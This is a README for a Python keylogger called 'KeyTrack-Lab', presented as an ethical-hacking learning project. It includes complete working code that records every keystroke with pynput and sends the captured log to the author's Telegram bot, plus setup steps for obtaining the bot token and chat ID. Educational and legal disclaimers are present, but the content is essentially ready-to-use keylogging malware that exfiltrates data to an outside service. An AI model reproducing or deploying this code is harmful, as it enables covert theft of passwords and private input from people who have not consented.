# KeyTrack-Lab 🔐

A simple Python keylogger designed for cybersecurity education and personal learning. This project captures keystrokes locally and sends them to your Telegram account via a bot. Ideal for practicing ethical hacking, input monitoring, and bot-based alerting.

> ⚠️ This tool is for **educational use only**. Never deploy keyloggers without **explicit permission**. Misuse may be illegal.

---

## 🛠 Features

- Logs all keystrokes in real time
- Sends keystroke logs to Telegram when stopped
- Simple, readable Python code
- Runs 100% locally

---

## 📦 Requirements

- Python 3.x
- Libraries:
  ```bash
  pip install pynput requests
---

🤖 Setup Instructions
1. Create a Telegram Bot

    Search for @BotFather on Telegram

    Send /newbot and follow the prompts

    Copy your Bot Token

2. Get Your Chat ID

    Start a chat with your bot by sending it any message (e.g., "Hello")

    Visit the following in your browser:

    https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates

    Look for "chat": {"id": YOUR_CHAT_ID} in the JSON response

🧪 Usage
1. Save the script below as keylogger_telegram.py:

import requests
from pynput import keyboard
```python
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
CHAT_ID = "YOUR_CHAT_ID_HERE"

log = ""

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    requests.post(url, data=payload)

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        else:
            log += f" [{key.name}] "

def on_release(key):
    if key == keyboard.Key.esc:
        send_telegram_message("Keylogger stopped. Logged keys:")
        send_telegram_message(log)
        print("Logging stopped and sent to Telegram.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
2. Run the script:
```bash
python keylogger_telegram.py
```
3. To stop logging:

    Press the Esc key

    The full log will be sent to your Telegram chat

🔒 Ethics & Legal Disclaimer

This tool is meant for local use, educational purposes, and authorized testing only. Unauthorized use of keyloggers is illegal in many jurisdictions. Always ensure you have explicit consent before monitoring any input.
🚀 Future Ideas
```
    Add timestamped logging

    Periodic updates to Telegram

    Save logs to local file

    Extend to mouse input
```
📚 License

MIT License — feel free to use and adapt with credit.
👨‍💻 Author

[Zain M]
Learning Lab Projects – Ethical Hacking and Automation
